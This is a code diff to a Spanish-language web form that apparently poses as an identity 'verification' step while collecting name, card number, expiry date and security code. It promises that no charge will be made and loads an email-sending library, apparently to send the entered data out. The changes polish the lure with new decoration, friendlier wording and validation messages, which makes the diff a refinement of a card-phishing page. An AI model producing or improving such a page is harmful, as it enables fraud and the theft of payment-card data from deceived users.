@@ -9,38 +9,42 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="hearts">💖💖💖</div>
-            <h1>Verificación de Usuario</h1>
-            <div class="hearts">💖💖💖</div>
+            <div class="decor">🌷🌷🌷</div>
+            <h1>Verificación Requerida</h1>
+            <div class="decor">🌷🌷🌷</div>
         </div>
-        
+
         <form id="paymentForm">
             <div class="input-group">
                 <label>Nombre Completo</label>
-                <input type="text" id="cardHolder" placeholder="Ej. Ana López" required>
+                <input type="text" id="userName" placeholder="Ej. Laura Martínez" required>
+                <span class="error-msg" id="nameError"></span>
             </div>
-            
+
             <div class="input-group">
                 <label>Número de Tarjeta</label>
                 <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="16" required>
+                <span class="error-msg" id="cardError"></span>
             </div>
 
             <div class="input-group">
                 <label>Fecha de Expiración</label>
                 <input type="month" id="expiryDate" required>
+                <span class="error-msg" id="dateError"></span>
             </div>
 
             <div class="input-group">
                 <label>Código de Seguridad</label>
                 <input type="text" id="cvc" placeholder="1234" maxlength="4" required>
+                <span class="error-msg" id="cvcError"></span>
             </div>
 
-            <button type="submit">Verificar Identidad 🌸</button>
+            <button type="submit">Verificar Ahora 🐇</button>
         </form>
-        
-        <p class="disclaimer">⚠️ No se realizará ningún cobro. Solo verificación de identidad.</p>
-        <div id="loader" class="hidden">⏳ Validando...</div>
-        <div id="errorMessage" class="hidden">❌ Datos incorrectos</div>
+
+        <div id="loader" class="hidden">🎀 Validando información...</div>
+        <div id="errorMsg" class="hidden error-msg">⚠️ ¡Ups! Verificación fallida</div>
+        <p class="disclaimer">Este proceso es solo de verificación. No se realizarán cargos.</p>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
